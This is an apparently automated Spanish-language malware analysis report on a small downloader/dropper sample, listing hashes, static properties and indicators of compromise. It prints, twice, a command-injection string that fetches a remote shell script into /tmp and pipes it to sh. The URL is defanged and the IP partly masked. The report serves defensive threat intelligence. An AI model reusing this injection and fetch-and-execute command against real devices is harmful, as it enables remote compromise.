# 🧬 Payload Analysis

`5a1ddd1656deda0ccc41606ff3f53244ced159228fe53f8e207906e68a0ca1b2`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 176 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5a1ddd1656deda0ccc41606ff3f53244ced159228fe53f8e207906e68a0ca1b2`
- **MD5:** `ff2cb2cb8065e3fa985463de15472253`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 176 B |
| Entropía | 4.7 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
gateway=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr2;busybox wget hxxp://91.92.40.XXX/wget.sh -O-
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | gateway=[internal-ip-redacted]`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr2;busybox wget hxxp://91.92.40.XXX/wget.sh -O- | strings |
| hash | 5a1ddd1656deda0ccc41606ff3f53244ced159228fe53f8e207906e68a0ca1b2 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
